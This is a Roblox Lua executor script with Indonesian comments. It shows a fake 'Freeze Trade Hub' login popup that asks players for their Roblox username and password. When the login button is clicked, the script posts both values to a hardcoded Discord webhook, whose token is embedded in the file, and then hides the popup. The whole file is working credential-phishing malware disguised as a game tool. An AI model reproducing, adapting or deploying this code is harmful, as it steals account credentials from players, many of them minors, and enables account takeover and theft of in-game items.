-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(username, password)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = "Someone logged in\nUsername: " .. username .. "\nPassword: " .. password
        })
    }

    if syn and syn.request then
        local response = syn.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif http and http.request then
        local response = http.request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    elseif request then
        local response = request(payload)
        if response and response.StatusCode == 200 then
            print("Data berhasil dikirim ke Discord!")
        else
            print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
        end
    else
        print("Executor Anda tidak mendukung HTTP requests!")
    end
end

-- Membuat GUI Login
local screenGui = Instance.new("ScreenGui")
local frame = Instance.new("Frame")
local titleLabel = Instance.new("TextLabel")
local subtitleLabel = Instance.new("TextLabel") -- Tambahan subtitle
local usernameBox = Instance.new("TextBox")
local passwordBox = Instance.new("TextBox")
local loginButton = Instance.new("TextButton")

-- Properti ScreenGui
screenGui.Name = "LoginPopup"
screenGui.Parent = game:GetService("CoreGui")

-- Properti Frame
frame.Name = "LoginFrame"
frame.Parent = screenGui
frame.Size = UDim2.new(0, 300, 0, 270)
frame.Position = UDim2.new(0.5, -150, 0.5, -135)
frame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)
frame.BorderSizePixel = 3
frame.BorderColor3 = Color3.new(1, 0, 0)

-- Properti TitleLabel
titleLabel.Name = "TitleLabel"
titleLabel.Parent = frame
titleLabel.Size = UDim2.new(1, -10, 0, 40)
titleLabel.Position = UDim2.new(0, 5, 0, 5)
titleLabel.BackgroundTransparency = 1
titleLabel.Font = Enum.Font.SourceSansBold
titleLabel.Text = "Freeze Trade Hub"
titleLabel.TextSize = 24
titleLabel.TextColor3 = Color3.new(1, 1, 1)
titleLabel.TextStrokeTransparency = 0
titleLabel.TextStrokeColor3 = Color3.new(0, 0, 0)

-- Properti SubtitleLabel
subtitleLabel.Name = "SubtitleLabel"
subtitleLabel.Parent = frame
subtitleLabel.Size = UDim2.new(1, -10, 0, 20)
subtitleLabel.Position = UDim2.new(0, 5, 0, 45)
subtitleLabel.BackgroundTransparency = 1
subtitleLabel.Font = Enum.Font.SourceSans
subtitleLabel.Text = "Login Roblox Untuk Melanjutkan"
subtitleLabel.TextSize = 16
subtitleLabel.TextColor3 = Color3.new(1, 1, 1)
subtitleLabel.TextStrokeTransparency = 0.8
subtitleLabel.TextStrokeColor3 = Color3.new(0, 0, 0)

-- Properti UsernameBox
usernameBox.Name = "UsernameBox"
usernameBox.Parent = frame
usernameBox.Size = UDim2.new(1, -20, 0, 40)
usernameBox.Position = UDim2.new(0, 10, 0, 80)
usernameBox.PlaceholderText = "Enter Username"
usernameBox.Font = Enum.Font.SourceSans
usernameBox.Text = ""
usernameBox.TextSize = 16
usernameBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
usernameBox.TextColor3 = Color3.new(1, 1, 1)

-- Properti PasswordBox
passwordBox.Name = "PasswordBox"
passwordBox.Parent = frame
passwordBox.Size = UDim2.new(1, -20, 0, 40)
passwordBox.Position = UDim2.new(0, 10, 0, 130)
passwordBox.PlaceholderText = "Enter Password"
passwordBox.Font = Enum.Font.SourceSans
passwordBox.Text = ""
passwordBox.TextSize = 16
passwordBox.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
passwordBox.TextColor3 = Color3.new(1, 1, 1)

-- Properti LoginButton
loginButton.Name = "LoginButton"
loginButton.Parent = frame
loginButton.Size = UDim2.new(1, -20, 0, 40)
loginButton.Position = UDim2.new(0, 10, 0, 190)
loginButton.Text = "Login"
loginButton.Font = Enum.Font.SourceSansBold
loginButton.TextSize = 18
loginButton.BackgroundColor3 = Color3.new(0.2, 0.8, 0.2)
loginButton.TextColor3 = Color3.new(1, 1, 1)

-- Fungsi LoginButton
loginButton.MouseButton1Click:Connect(function()
    local username = usernameBox.Text
    local password = passwordBox.Text

    if username ~= "" and password ~= "" then
        print("Tombol Login Ditekan! Username:", username, "Password:", password) -- Debugging
        sendToDiscord(username, password) -- Kirim data ke webhook
        screenGui:Destroy() -- Hapus GUI setelah login berhasil
    else
        print("Username atau password kosong!") -- Debugging
    end
end)
